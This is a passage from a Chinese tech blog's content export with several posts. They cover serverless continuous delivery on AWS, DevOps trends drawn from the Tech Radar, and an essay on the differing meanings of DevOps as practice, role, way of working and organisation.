进行开发，然后不断向下进行分解。在统计最后的测试代码和测试工作量的的时候，我们有了很有趣的发现：\nEnd-2-End （UI）的测试代码占30%左右，占用了开发人员 30% 的时间（以小时作为单位）开发和测试。\n集成测试（函数、服务和 API Gateway 的集成）代码占 45%左右，占用了开发人员60% 的时间（以小时作为单位）开发和测试。\n单元测试的测试代码占 25%左右，占用了10%左右的时间开发和测试。\n一开始我们以为我们走入了”蛋筒冰激凌反模式“或者”纸杯蛋糕反模式“但实际上：\n我们并没有太多的手动测试，绝大部分自动化。除了验证手机端的部署以外，几乎没有手工测试工作量。 我们的自动化测试都是必要的，且没有重复。 我们的单元测试足够，且不需要增加单元测试。 但为什么会造成这样的结果呢，经过我们分析。是由于 AWS 供了很多功能组件，而这些组件你无需在单元测试中验证（减少了很多 Stub 或者 Mock），只有通过集成测试的方式才能进行验证。这也意味着：\nServerless 基础设施大大降低了单元测试的投入，但把这些不同的组件组合起来则劳时费力。\n如果你有多套不一致的环境，那你的持续交付流水线配置则是很困难的。因此我们意识到：\n你不再需要多个运行环境，你只需要一个多阶段的生产环境 (Multi-Stage Production) #通常情况下，我们会有多个运行环境，分别面对不同的人群：\n面向开发者的本地开发环境 面向测试者的集成环境或测试环境（Test，QA 或 SIT） 面向业务部门的测试环境（UAT 环境） 面向最终用户的生产环境（Production 环境） 然而多个环境带来的最大问题是环境基础配置的不一致性。加之应用部署的不一致性。带来了很多不可重现问题。在 DevOps 运动，特别是基础设施即代码实践的推广下，这一问题得到了暂时的缓解。然而无服务器架构则把基础设施即代码推向了极致：只要能做到配置隔离和部署权限隔离，资源也可以做到同样的隔离效果。\n我们通过 DNS 配置指向了同一个的 API Gateway，这个 API Gateway 有着不同的 Stage：我们只有开发（Dev）和生产（Prod）两套配置，只需修改配置以及对应 API 所指向的函数版本就可完成部署和发布。\n然而，多个函数的多版本管理增加了操作复杂性和配置性，使得整个持续交付流水线多了很多认为操作导致持续交付并不高效。于是我们在思考\n对函数的管理和” NanoServices 反模式 “ #根据微服务的定义，AWS API Gateway 和 Lambda 的组合确实满足 微服务的特征，这看起来很美好。就像下图一样：\n但当Lambda 函数多了，管理众多的函数的发布就成为了很高的一件事。而且， 可能会变成” NanoService 反模式“\nNanoservice is an antipattern where a service is too fine-grained. A nanoservice is a service whose overhead (communications, maintenance, and so on) outweighs its utility.\n如何把握微服务的粒度和函数的数量，就变成了一个新的问题。而 Serverless Framework，就是解决这样的问题的。它认为微服务是由一个多个函数和相关的资源所组成。因此，才满足了微服务可独立部署可独立服务的属性。它把微服务当做一个用于管理 Lambda 的单元。所有的 Lambda 要按照微服务的要求来组织。Serverless Framework 包含了三个部分：\n一个 CLI 工具，用于创建和部署微服务。 一个配置文件，用于管理和配置 AWS 微服务所需要的所有资源。 一套函数模板，用于让你快速启动微服务的开发。 此外，这个工具由 AWS 自身推广，所以兼容性很好。但是，我们得到了 Serverless 的众多好处，却难以摆脱对 AWS 的依赖。因为 AWS 的这一套架构是和别的云平台不兼容的。\n所以，这就又是一个“自由的代价”的问题。\nCloudNative 的持续交付 #在实施 Serverless 的微服务期间，发生了一件我认为十分有意义的事情。我们客户想增加一个很小的需求。我和两个客户方的开发人员，客户的开发经理，以及客户业务部门的两个人要实现一个需求。当时我们 6 个人在会议室里面讨论了两个小时。讨论两个小时之后我们不光和业务部门定下来了需求（这点多么不容易），与此同时我们的前后端代码已经写完了，而且发布到了生产环境并通过了业务部门的测试。由于客户内部流程的关系，我们仅需要一个生产环境发布的批准，就可以完成新需求的对外发布！\n在这个过程中，由于我们没有太多的环境要准备，并且和业务部门共同制定了验收标准并完成了自动化测试的编写。这全得益于 Serverless 相关技术带来的便利性。\n我相信在未来的环境，如果这个架构，如果在线 IDE 技术成熟的话（由于 Lambda 控制了代码的规模，因此在线 IDE 足够），那我们可以大量缩短我们需求确定之后到我功能上线的整体时间。\n通过以上的经历，我发现了 CloudNative 持续交付的几个重点：\n优先采用 SaaS 化的服务而不是自己搭建持续交付流水线。 开发是离不开基础设施配置工作的。 状态和过程分离，把状态通过版本化的方式保存到配置管理工具中。 而在这种环境下，Ops工作就只剩下三件事：\n设计整体的架构，除了基础设施的架构以外，还要关注应用架构。以及优先采用的 SaaS 服务解决问题。 严格管理配置和权限并构建一个快速交付的持续交付流程。 监控生产环境。 剩下的事情，就全部交给云平台去做。\n","date":"February 1, 2018","permalink":"/blog/2018/2018-02-01-serverless-continurous-delivery/","section":"Blogs","summary":"","title":"Serverless 风格的微服务的持续交付"},{"content":"","date":null,"permalink":"/tags/service-mesh/","section":"Tags","summary":"","title":"Service Mesh"},{"content":"今年4月份，我第一次以主编的身份参加技术雷达的翻译工作。有幸第一时间参加到技术雷达的翻译过程中。通过我在翻译其间对条目的了解和观察，我写下了《 DevOps发展的九个趋势》\n今年11月份，我再一次以执行主编的身份参加第17期技术雷达的翻译工作。17 期技术雷达中两大主题：Kubernetes 和 Cloud as the New Normal 都是 DevOps 相关的。而且本期技术雷达涌现了众多 DevOps 相关的新条目。一方面说明了 DevOps 在 IT 业的重要性日渐增加，一方面也支撑起了 DevOps 社区在工具和实践上的创新。虽然每个人对 DevOps 的理解不尽相同，但能持续的着眼在具体的问题并提供实际的解决方案则是值得称道的。\n这些新的变化对我上一期的 DevOps 技术趋势判断和发展有了新的思考和认识，借由此文分享给大家。\n回顾2017年 DevOps 发展 #在今年 4月第16期技术雷达发布后，我分析了 DevOps 发展的九个趋势。我认为这九个趋势代表了2017年 DevOps 技术的发展方向。让我们来结合最新的技术雷达回顾一下2017年这些趋势的发展。\n趋势1：微服务目前仍然是DevOps技术应用和发展的主要领域 #现状：微服务的相关技术仍然不断涌现。但人们似乎过于乐观的估计了微服务的投资回报速度。架构演进是一个长期的过程，而实践中的陷阱和问题越来越多。不断涌现的诸多工具和解决方案说明了微服务的反思已经开始。让我们期待更多微服务的案例出现。\n趋势2：以Docker为核心的数据中心方案逐渐走向成熟 #现状：Kubernetes 生态圈在 Docker 编排工具的争霸大战中笑道了最后，本期技术雷达把 Kubernetes 移动到了“采用”中，证明 Kubernetes 是经得住时间考验的工具。随着越来越多的厂商和社区开始围绕 Kubernetes 构建自己的产品，我相信基于 Kubernetes 的产品和工具会越来越多。\n趋势3：不完整的DevOps实践阻碍着DevOps的发展 #现状：虽然 DevOps 社区的活跃程度催生了一大批的工具和平台，但却在推广实践上发力不足。接受了局部技术改进后的 DevOps 演进似乎立刻停止，使得 DevOps 难以发挥出更大的价值。随着时间的发展，这种局面会愈来愈常见。如方法论的推广落后于工具的发展，那么 DevOps 运动的寿终正寝也将为期不远。\n趋势4：领域特定的DevOps实践开始出现 #现状：虽然并没有十分特别的领域特定的 DevOps 技术出现。但受到 DevOps 启发的 DesignOps 和 DevSecOps 也分别有了自己的社区群体。期待它们在未来有进一步的表现。\n趋势5：采用DevOps进行技术债务重组和技术资产管理 #结果：我写下这个趋势的第二周就进入了这样一个技术资产管理项目并工作到现在。在这 6 个月中我和同事们采用了 DevOps 理念和技术进行技术资产重组和互联网企业 IT 资产并购，并体会到了其中的诸多益处，大大节约了产品上线时间和上线风险，而且产品的开支的随着时间以更快的速度递减。随着 CloudNative 的技术和概念的成熟，相信这类的项目和案例会越来越丰富。\n趋势6：安全成为推动DevOps全面发展的重要力量 #结果：OWASP Top10 和 OWASP Top10 Mobile 的姗姗来迟虽然并未进入本期技术雷达。但并不表明技术雷达对安全有所松懈，这反而是一种更加负责的态度。而安全相关的实践已从使用工具进入安全场景的设计。例如最新期的 3Rs 安全 和 上一期就提到的 KeyCloak，以及本期提到的用于安全的 Sidecar 模式。\n趋势7：Windows Server和.NET平台下的DevOps技术潜力巨大 #现状：随着 Azrue 的成熟 和 Windows Conatiners 的推出，Windows 领域的 DevOps 关键工具链即将打通。但是 MS-DevOps 的“最后一公里”显得比较艰难。MS-DevOps 的社区的发展并不活跃，使得 Windows Server 的相关实践略显不足，这进一步限制了 DevOps 相关技术在 Windows 平台上的作为。\n趋势8：非功能性自动化测试工具的逐渐完备 #现状：更多的工具开始围绕“自动化测试”展开，关于自动化测试为开发带来的诸多益处以无需多言。在本期技术雷达里我们看到了更多这样的技术出现，例如：TDD in Containers，Flood.io 用于负载测试，Heptio Sonobuoy 用于合规测试。而一个成熟稳健的架构，必须要经得起来自各方面的测试。\n趋势9：Python成为DevOps工作中所不可或缺的语言 #现状：Python 仍然重要，但 Go 语言在 Ops 相关工具中的地位也在逐步提升。\n2018 年的 DevOps 技术的发展趋势 #虽然条目众多，但我们可以从技术雷达中整理出 4 个 DevOps 发展脉络：\n趋势1：微服务的实践进入深水区 #微服务在部分企业的成功给所有的企业描述了一个美好的愿景，但通往这条美好之路的路程则并不那么一帆风顺。\n微服务是成功的结果，而非成功的原因，我把成功的架构转型经验的结果架构称之为微服务架构。但这并不是微服务成功的动因，毕竟这些最初成功应用微服务企业最开始的时候并没有“微服务”的概念。而能够让微服务成功一定是在特定场景下遵守了某些重要的原则。而这些特定的场景和原则似乎被人忽视，而只能从表象上描述这一成功的结果。\n随着微服务在各种场景下的应用，针对不同行业，不同组织，不同技术上下文的实践被慢慢总结出来。有些是成功经验，有些则是反思。例如: **Service Mesh （服务啮合）**和 **Overambitious API gateways（过度庞大的API网关产品）**就是相互关联的技术。而 KONG API Gateway 就是一个十分不错的 API 网关工具，但结合了不同的上下文，可以得到不同的结果。\n成功微服务实践者一直在强调康威定理的重要性，而现实中的企业往往忽视条经验。同样的技术和工具，在不同的业务上下文和组织结构里，就会得出不同的结果。Kafka 的使用并不能表示你正在往正确的路上走，仅仅替换了工具而非思维和架构模式会将你带入 Recreating ESB antipatterns with Kafka（用 Kafka 重建 ESB 反模式）。所以，采用某些技术或工具一定要识别对正确的场景。\n另一方面，成功的经验和重复被证明成功的微服务实践则作为框架被流传了下来。Spring Cloud 作为微服务解决方案的杰出代表继续在技术雷达中拥有自己的一席之地，以至于现在任何一本关于微服务的书都是以 Spring Cloud 展开的。此外，技术雷达里有增添了 Spring Cloud 的新成员：Spring Cloud Contract 是和 Spring 框架结合紧密的消费者驱动契约测试的工具。这说明消费者驱动的契约测试被证明是有效的微服务测试方法。尽管技术雷达第一次提出消费者驱动的契约测试已经过去了3年。\n当微服务的架构转型到了深水区，微服务的标准实践架构即将出现，一扫微服务生态圈的混乱情况。就如曾经发生在 Docker 社区中的一样。\n趋势2：如果你正在使用 Docker，请向 Kubernetes 迁移 #技术雷达一直保持着对 Docker 社区的关注度，因为这是我们普遍采用的技术。但在大规模的使用上面，技术雷达则相对保守，尽管技术雷达从 2015 年就开始关注 Kubernetes ，但直到这次才放到“采用”区域里，证明了Kubernetes 已经非常成熟。围绕着 Kubernetes 生态工具链也逐渐完善，无论是厂商（Google 的 GKE 解决方案，还是 AWS 的 EKS）提供的完整平台。还是社区的 Kops 和 Sonobuoy 这样的，都不断在增强 Kubernetes 在生产环境的实际应用能力。\n如果你之前也在观望容器大战，现在可以果断进入 Kubernetes 了，如果你准备在生产环境使用 Docker，请优先考虑 Kubernetes。如果你已经用了 Kubernetes，那么恭喜你！希望你能将你的杰出实践经验分享给大家。\n趋势3：Cloud Native DevOps #云计算技术不光极大降低了 IT 运营成本，更改变了开发和运维的工作方式。DevOps 在企业级的应用遇到的更多阻力在云端，无论是应用架构还是工作方式。\n很多企业仍然仅仅把云平台当做一个 “远程托管机房”，并没有发挥出云平台组件和 SDK 带来的组合性优势。\nCloudNative 最大的思维转变当属 Stateless Infrastructure（无状态基础设施）。这样可以大幅度保障应用的可用性和水平扩展能力，当传统的计算资源和存储资源已经通过云计算技术达到了海量。应用的瓶颈就来自于应用架构和基础设施结构。如果还在思考基础设施的状态如何监控和保存，就又进入了老的思维模式，只不过换了新的工具而已。\nServerless Framework 和 Apex 框架就是采用 CloudNative 思维的代表，在实际的应用中它颠覆了我们对软件开发和运维的很多认识。把基础设施当做一个资源相对无限的状态机，你的应用就是这个状态机的状态配置，并通过版本化的手段在线保存状态。把对基础设施和设备的依赖降低到最小：只需要一个代码库。\n而在这样的情形下，我们不需要构建一套开发环境和测试环境（你并不想只十几行代码就需要搭建一套虚拟的云计算环境）。而全部都在生产环境上工作，只不过生产环境有高级别的隔离，且各部分状态不同，有的是在生产状态，有的是在开发测试状态。\n此外，更多的开发基础设施和测试工具以平台的形式也相继推出，它们不光提升了安全性和稳定性，更降低了企业 IT 资产总和管理成本。例如：CircleCI 和 BuildKite 就是持续集成服务器的平台化实现，只需要在代码里有很少的配置就可以解决搭建整套持续交付流水线的各种繁琐步骤和功能。Flood.io 则是通过在云端模拟大量的用户访问请求进行负载测试，这不光有助于你发现自己的基础设施和应用的瓶颈，更能帮你预演在高流量的状况下整个团队的响应能力。\n由于众所周知的原因，我们无法访问本期技术雷达提到的 GCP（Google Cloud Platform），有限的使用 AWS 和 Azure，但仍然无法阻挡云计算的发展迅猛之势。\n当云计算平台提供了一系列廉价而又灵活的基础设施之后。实践 DevOps 的你需要思考如何把传统的实践推向极致。\n趋势4：自动化，更多的自动化 #自动化永远是 DevOps 的核心主题之一，各种自动化测试工具和平台的兴起似乎在说明我们以往的自动化测试是不够的。新的自动化测试工具和方法正在越来越多。本期我们看到了关于 TDD in Containers 和 Sonobuoy，由于新版本 Chrome 的 Headless 模式的发布，未来的自动化测试则会越来越多，越来越完整。\n我们可以把基础设施想象成一个软件产品，通过基础设施流水线构建这样的产品。我们甚至可以使用基础设施流水线把生产环境的更新做到极致：每天进行生产环境的从头构建，自动化配置网络以及基础设施，自动化还原数据库备份，每天产生一个可用的架构。这样的生产环境上就会有两个架构：一个生产中，一个待生产。你不在需要开发环境和测试环境，每天的工作都保存在待生产的架构上。由于第二天就要发布，因此今天会把所有的工作控制在明天发布之前完毕，而且要符合生产要求。这样就可以迫使团队把自己的工作自动化并且提升交付质量。也避免在自己的电脑上或者某个代码分支上存储很久。\n数据中心的灾后重建就是极为痛苦的事情，因此需要做灾备预演。而现有的阶段性灾难预演已经无法满足要求。所以对于云端的基础设施来说，有灾难要预演，没有灾难要制造灾难预演。这样可以使你基础设施和应用架构达到极端的可用性和可恢复性，同时实现了3Rs安全。就像《持续交付》一书中所说的：经常做那些让你感到痛苦的事情。由于 AWS 提供了 VPC 级别的隔离，我已经可以通过 CloudFormation + Ansible 做到这一点，未来会把相关经验分享给大家。\n另一方面，我们看到了 基于算法的IT运维（Algorithmic IT Operations），甚至提出了 AIOps 的概念。但基于算法的运维仍处在初步阶段。虽然我很乐于看见新的技术发展趋势，但每个领域的 AI 热潮是掩盖了真正的问题，还是让我们更快的找到了问题的正确答案？还有待观察。\n最后 #17 期的技术雷达的关注重点在 DevOps 上。一方面说明企业级应用正在全面的向云迁移，另一方面也说明云平台上的技术发展也在同样进步。在这个过程中我们遇到了新的问题，同时也遇到了新的机遇。当前这一系列的DevOps 技术的浪潮会带来什么样的发展，明年的技术雷达将会揭晓。\n","date":"December 7, 2017","permalink":"/blog/2017/2017-12-07-devops-trends-in-tech-radar/","section":"Blogs","summary":"","title":"从最新一期技术雷达看 DevOps 的发展"},{"content":"在过去的三年中，我作为 DevOps 的咨询师参与了很多企业的 DevOps 转型咨询以及技术实施，也在不同的社区活动中分享了自己在 DevOps 上的实践、理解和观点。\n随着 DevOps 的盛行，我在很多场合和越来越多的人聊起 DevOps。也在不同的渠道听到了很多人在讲 DevOps。然而，讨论的背后，我发现每个人对 DevOps 所指并不是同一件事情，也由于各执一词导致不欢而散。\n于是我通过 DevOpsDays 的官方网站整理所有 DevOps 的有关材料，随着学习和了解的不断增多，我也渐渐的对 DevOps 有了更进一步的认识。我把学到的材料经过整理后把陆续放在了简书上，形成了\u0026quot; DevOps 前世今生\u0026quot; 这个系列，这个系列还在不断补充新的材料。\n含义越来越丰富的 DevOps #DevOps 至今都缺乏一个清晰和统一的认识。对于一场运动来说，这是一件好事，也同样是一件坏事。虽然 Patrick 曾经在自己的博客里一再提到自己对 DevOps 的\u0026quot;正确认识\u0026rsquo;\u0026rsquo;，但社区似乎不以为然。\n缺乏“官方定义”好处是人人都可以定义，因此没有一个人或者组织可以垄断 DevOps 定义权。所以每个人都自己可以参与到这一运动中去，不断为其增加新的概念、新的实践和新的工具。这会使 DevOps 社区不断的繁荣。\n而坏处也很明显，对于 DevOps 的后来者 —— 那些没有参与进来的人，需要学习和理解的 DevOps 知识的广度和深度也越来越大。\n以至于后来出现了这幅众所周知的“盲人摸象图”：\n这幅图中包含了很多概念，但主要表现的意义 DevOps 是一系列概念的总和，任何一个单方面的定义只是 DevOps 的一个部分，而不是 DevOps 的整体，随着 DevOps 这个概念的不断膨胀，人们就更难理解 DevOps 了。\n那么，你理解的 DevOps 是指的什么 #在接触了各类客户和社区之后，我开始尝试理解每个人谈到 DevOps 的时候，他们分别指的是什么，以及所指内容背后的目标和动机。渐渐的，我把我所听到的 DevOps 概念分成如下四类，分别是：\nDevOps 是一组技术/实践 DevOps 是一个角色 DevOps 是一种工作方式 DevOps 是一种组织结构 那么，我们分别来谈谈这四类 DevOps。\n当 DevOps 是一组技术/实践 #在工程师文化的组织里，对先进技术的渴望是最常见的学习动机。可以促进工程师用更有效率，更优雅的方式解决问题。而对于非工程师文化的组织，新的技术往往是提升其 KPI 的工具。以下是我听到 DevOps 的时候，经常触及的话题：\n高频部署 持续交付 云计算/虚拟化技术 基础设施即代码 Docker 自动化运维 高频部署 #曾经和某跨国著名银行的外汇交易产品的 IT 产品负责人交流 DevOps。对方很自豪的告诉我，他们产品每天的部署频率超过500次，我听了不以为然。因为，部署频率高不见得是件好事。于是我问了以下几个问题：\n为什么你们需要这么频繁的部署？有这么频繁变动的业务需求吗？ 在这么多次部署里，是发布业务价值的部署更多，还是修复问题的部署更多？ 这些生产环境的变更难道完全是不可规划的吗？ 由于对方的金融业务有相应的法律法规，理论上没有这么频繁的变更需求，除非清理技术债，否则没有很强烈的变更动机。但对方并没有直接回答我的问题，而是换到了其它问题上，因此我最终也不清楚对方这么频繁变更的驱动力。\n这对我有一个重要的：指标导向的 DevOps 往往是一种 DevOps 的反模式，它会忽略和掩盖真正的问题。\n指标的背后是某种度量，如果部署频率一直很高，一定反应了某种现象。而这些现象不一定是个好现象：不是业务的变动很频繁，就是技术的变动很频繁。但如果二者都频繁，我们应该衡量变更带来的价值和风险（当然，DevOps 可以降低变更的风险），并优先变更价值较高的请求。有可能新的业务尝试让我们从市场上获得了更多的关注，也有可能新的技术提升了生产率。但无论是哪一种，部署频率应该是一个有多到少不断循环的过程。这表明系统在走向成熟和稳定的同时，能够及时响应变化，无论是对技术还是对业务，对变更产生的影响都需要一段时间去积累和总结数据。\n此外，DevOps 绝不是为了提升部署频率而牺牲了软件质量和业务价值，甚至是安全措施。换句话说，DevOps 不是一种对质量的平衡和妥协，它是一种全局改进。全局的改进就意味着以价值为最高原则所度量的相关指标是不能有所下降的。\n持续交付 #持续交付是 DevOps 中非常重要的实践，持续交付的思想远早于 DevOps 。但直到第二届欧洲的 DevOpsDays 才有了持续交付这个重量级话题。因为持续交付本身也通过技术手段和实践解决了 DevOps 最初所面临的 Dev 和 Ops 的合作问题。\n不夸张的说，如果 Patrick Debois 早一点读到持续交付中运维相关的话题，说不定就没有 DevOps 了。\n然而，随着 DevOps 的理念的发展比持续交付融汇了更多的概念（这就是没有一个人能垄断定义的好处），使得 DevOps 更加广泛和盛行。因此， DevOps 所涵盖的范围已经超出了持续交付本身。\n我把 持续交付 列为 DevOps 的核心实践之一，因为如果你没有实践 持续交付。那么根本不能称之为 DevOps，但是如果你完整实践了持续交付，那么你离完整的 DevOps 也不远了。\n云计算/虚拟化技术 #随着分布式应用的井喷式发展。基础设施的管理成为了分布式应用的新瓶颈。在集中式管理的时代，大型应用只能运行在昂贵的小型机上，只有微软，SAP， IBM ，Oracle 和 EMC 这样的企业才有能力提供相应的产品完成这样复杂度很高的架构。因此企业需要单独的运维部门（Ops）来管理这些软件和设备。\n而随着虚拟技术和云计算的兴起，企业的基础设施管理工作往往变得很简单。VMWare 这样的虚拟技术企业和 AWS 这样的云计算供应商提供了更加成熟和稳定的产品。大大的节约了企业机房管理的开支。\n而 Ops 也不再需要进出机房，只需要通过远程桌面的方式就可以使用各种 SDK 开发工具去完成过去很多只有在机房才能做到的操作。\n然而，即使云计算和虚拟化技术提升了 Ops 的生产率，减轻了 Ops 的痛苦。但仍没有解决 Dev 和 Ops 之间的矛盾 —— 开发团队和维护团队仍然各自为政，仍然通过制度谈判而不是合作共赢来工作，毕竟目标是相对立的。\n基础设施即代码 #随着设备和网络的持续增多，加之更加复杂的应用部署和初始化。基础设施的管理成为了一个十分尖锐的问题。当复杂度上升一个量级，就需要专业的管理工具来管理这类问题。于是 Puppet 这样的框架顺势而出。以至于在 《DevOps Handbook》中，合著者之一的 John Willis 在理解了 PuppetLab 的创始人 Luke Kanies 的想法之后，才有了 DevOps 的最初理解。\n基础设施即代码利用了编程语言和虚拟化工具 API 的无缝连接达到这一目的。它在很大程度上把基础设施的管理当做其问题域，采用正确的面向对象方式，让开发人员和运维人员能够理解并设计出更加稳定和灵活的基础设施。大大降低基础设施变更的风险：提升了运维知识的透明度并使基础设施变更具备幂等性。\n此外，它在一定程度上解决了不同环境（开发，测试，生产）之间的不一致问题，也让开发人员能够学习到 Ops 领域的知识并用软件开发的优秀思想解决运维领域的问题。\n因此，基础设施即代码除了工具以外，更是一种 Dev 和 Ops 之间相互沟通的媒介，能够让开发人员和运维人员相互理解。所以，基础设施即代码毫无疑问的是 DevOps 的核心实践之一。\nDocker #Docker 是含着 DevOps 的金钥匙出生的，它诞生的第一天就带着 DevOps 的基因：更简单的解决了基础设施即代码和虚拟化在实践中的问题，进一步提升了自动化能力以提升效率，并且对开发人员和运维人员都十分友好。\n甚至很多地方都会以是否采用 docker 来评判是否采用了 DevOps 的相关技术。\nDocker 一定程度上简化了基础设施的初始化和状态管理问题。通过镜像和运行时容器封装了应用运行时的复杂度。并通过容器的编排实现轻量级的分布式架构，也更加经济快捷。\n但是，Docker 和任何一种工具一样，都不是”黄金锤“。当用错了场景，使用 docker 可能是一场灾难。我曾经参与并帮客户完成了一个数据中心迁移的项目，就是采用的 docker 作为统一的运行时容器。最初是因为 docker 镜像的移植性好，在各种异构 Linux 系统上可以正确执行，且镜像构建过程透明。但是客户为了能让这个业务场景更加通用，又分别采用了另外两种工具对其部署场景进行封装，并写出了第三个工具。由于这个工具并没有很好的分离其业务关注点和技术关注点，导致这个工具使用异常繁琐，需要增加更多额外的配置去定制化容器运行环境。原本为了提升生产效率的手段反而成为了阻碍效率的绊脚石。\n自动化运维 #看了以上那么多的工具和技术，很多对 DevOps 望文生义或有些技术了解的运维工程师认为提高了自动化运维的水平，就是 DevOps。虽然 DevOps 里的一个重要特征是“自动化”，但拥有自动化运维，并不代表你就正在实践 DevOps，很可能你仅仅提升了运维部门的效率，但并没有从全局的角度提升开发和运维之间的效率和端到端价值的流动。因此，仅仅有自动化运维，还不足以称之为 DevOps。\n关于 “ DevOps 技术” #以上列举了很多所谓 “DevOps 技术”，是从技术的角度来认识 DevOps。然而，不探索 DevOps 真正的问题，以及技术背后的目的和最佳实践。往往会使导致对 DevOps 的片面了解而适得其反。\n从 DevOps 运动发展的历史上来看，DevOps 相关技术是解决 DevOps 相关问题的结果，而非起因。因此，对于 DevOps 的理解如果本末倒置，则很有可能起到东施效颦的结果。你会发现你拿着一堆 DevOps 的锤子，看见了可能并不存在的钉子。\n此外，我相信掌握工具对于工程师群体来说不是一件难事，并且随着技术的发展，工具和平台的使用会越来越容易。但是，能够跳出自己的舒适区和思维习惯，从全局的角度观察并解决问题的能力则是很多工程师所欠缺的。\n当 DevOps 是一个岗位角色 #当 DevOps 传播开来，大家都会倾向于去找叫做 “DevOps” 的人，希望通过招聘和培训来提升自己的 DevOps 能力。 于是设置了一些称之为 \u0026ldquo;DevOps 工程师\u0026rdquo; 的岗位和角色。通过对这些招聘需求以及客户对 DevOps 的需求，我发现了四个不同但是相关的 \u0026quot; DevOps 工程师 \u0026quot; ：\n作为 Dev 的 Ops（会开发技能的运维工程师） 作为 Ops 的 Dev（会运维技能的开发工程师） 基础设施开发工程师 全栈工程师 作为 Dev 的 Ops #有很多人也会认为，只要让开发工程师掌握运维技能，运维工程师掌握开发技能，就做到了 DevOps。这招来了很多运维工程师的反感。我采访过一些运维工程师，当初他们就是不喜欢也不想写代码，才选择了运维方向。\n这种想法的其中一个动机是在于架构的逐渐稳定带来的运维工作减少，特别是使用了云计算技术和虚拟化技术的企业。这会让管理层有一种错觉，认为运维团队的空闲状态，一定程度上是浪费。因此，为了达到“人尽其用”，让运维工程师进入开发团队去写业务代码。并用“DevOps\u0026quot;作为对这种措施这一合理化的幌子。\n这种想法的天真在于忽视了开发和运维的专业性和差异性。这让我想起一个段子：\n老板：“我怎么觉得在公司的运营中你们部门没起多大作用？”\n运维经理：“你走过大桥吗？”\n老板：“走过。“\n运维经理：“桥上有栏杆吗？”\n老板：“有。”\n运维经理：“您过桥的时候扶栏杆吗？”\n老板：“不扶。”\n运维经理：“那么，栏杆对您来说就没用了？”\n老板：“那当然有用了，没用栏杆护着，掉下去怎么办？”\n运维经理：“可是您没有扶栏杆啊！？”\n老板：“…… 可是 …… 可是没有栏杆，我会害怕！“\n运维经理：“那么，运维就是桥上的栏杆。“\n虽然我不否认技术的发展对二者来说难度和门槛在不断降低。而且掌握一定开发技能的运维工程师前景更加光明。但是强人所难并不会让事情变好。此外，这类人才可遇不可求，也不要因为招不到这样的人而阻止了 DevOps 实践。\n作为 Ops 的 Dev #同样的误解也会发生在开发工程师身上。对于开发工程师来说，其实难度并没有增加。无非是把 Ops 的工作当做需要通过别的工具完成的开发需求而已，甚至很多开发工程师自己也这么认为。\n运维除了知识以外，很大一部分的不可替代性来源于生产环境的维护经验。然而这些经验不可复制，因为有些问题作为开发人员来说你很难碰到。我曾打趣的说，当你听到有人说“这不可能啊”，他一定是个运维新手。\n就像我在上文强调的，软件开发和软件维护是相互关联但是各自独立的专业领域。DevOps 并不是要消除任何一方，而是要通过更加深入的合作成为彼此工作的润滑剂而非绊脚石。\n对于开发工程师来说，掌握更多的技能绝对是一件好事。但也不要低估运维的专业性和经验性。\n基础设施开发工程师 #由于有了虚拟化和基础设施即代码这样的技术，“通过 Dev 的方式完成 Ops 的工作，就是 DevOps “ 也很自然的成为了很多 Ops 对 DevOps 的认识。指的是通过 SDK，相关工具和配置文件，利用现有的平台资源，为应用程序构建基础设施。而他们往往有一个新的称谓：基础设施开发者 （Infrastructure Developer）或这 云计算工程师 （Cloud Engineer）。\n有一次到马来西亚出差，我称自己是 Infrastructure Developer 被 Uber 司机当做政府基建项目开发商\u0010问了一堆稀奇古怪的问题，当然我并没有澄清，而是继续逗他 ;-D\n在一些企业里，基础设施开发工程师都会肩负着推行企业 DevOps 的责任。但很少有企业能够明确 DevOps 是要做什么（这就是 DevOps 缺乏基准定义的坏处），而这些基础设施开发工程师会慢慢变成一个孤立的“平台团队”，这对 DevOps 是不利的。\n全栈工程师 #当然绝对不排除有些工程师是既懂开发也懂运维的\u0026quot;复合型人才\u0026quot;。但这样的人才的成本也十分高昂：一方面是寻找这样的人所花费的时间。另一方面是雇用这样的人所花费的资金。此外，对于某些企业来说还有培养这样人才的成本。\n但是，仅仅认为有了这样的人才就具备 DevOps 的能力也并不现实。首先，DevOps 是一个团队属性，而不是一个人属性。一个人的力量相较于一个团队来说，还是很有限。其次，招聘这样的人主要还是为了胜任纷繁多变的工作，创业公司尤其如此。因此，我有时候会戏称全栈工程师为“全干工程师”，听起来很厉害，但工作境遇并不见的很好。\n你可能只需要一个 “DevOps 晃动器” #软件开发和软件运维，是两类不同但联系很密切的事务，在过去很长的时间里。由于专业性和责任的不同从甲乙双方的矛盾变成了企业内部的矛盾。这是企业在互联网转型过程中的必经阶段，因为运维的开发不密切合作带来的问题日渐突出。而如何平滑的过渡，则是 DevOps 成败关键所在。你所需要不光是工程人才，你还需要新型的管理人才或者外部顾问来推动这项改进。\n一般来说，DevOps 的变革一定会调整组织的制度和做事方式。而制度层面的改变从企业内部是很难做到的。企业越大，“不求有功，但求无过”的鸵鸟心态普遍存在，因此越是大型的组织，所面临的组织僵化会越严重。组织僵化不见得是一件坏事，这意味着你的企业组织形态更加的问题和高效，这是长时间积累的结果。但由于过于高效，组织僵化的负面效应就是缺乏创新。\n所以，要推动企业的 DevOps 转型，特别是制度方面的创新，往往需要从组织外部引入“晃动器”（无论是聘用新的管理人才，还是外部顾问）来松动一下过于高效的组织，这都是能够帮助组织解除僵化的方式。\nDevOps 是一种工作方式 #这算是最贴近 DevOps 的目标的定义。但是在理解和时间上也是问题百出，片面的理解和机械的模仿都会造成 DevOps 之痛。对于 DevOps 的工作方式，有以下四个常见的理解：\n用 Dev 的方法做 Ops 的事 换了名字的 Ops 团队 一个有 Ops 的 Dev 团队 一个 Dev 和 Ops 合作的团队 用 Dev 的方式做 Ops 的事 #当你采用了上文中的 “基础设施即代码”，或者你有了“基础设施开发工程师”的时候。很自然的会想“我已经做到 DevOps 了”。然而，如果你并没有注意我在上述概念中特别提到的情况，那么你可能得到的只是下面所述的”换了名字的 Ops 团队“。\n换了名字的 Ops 团队 #这其实是很多公司的做法，认为 DevOps 所做的事情只是技术的更新，并无其它。\n在 2016 年底我在悉尼的一个 DevOps 项目上做转型咨询，客户的应用系统是基于 AWS 构建的。并且客户始终认为 DevOps 工程师就是上文所述的基础设施开发团队，只是工作的内容全都在 AWS 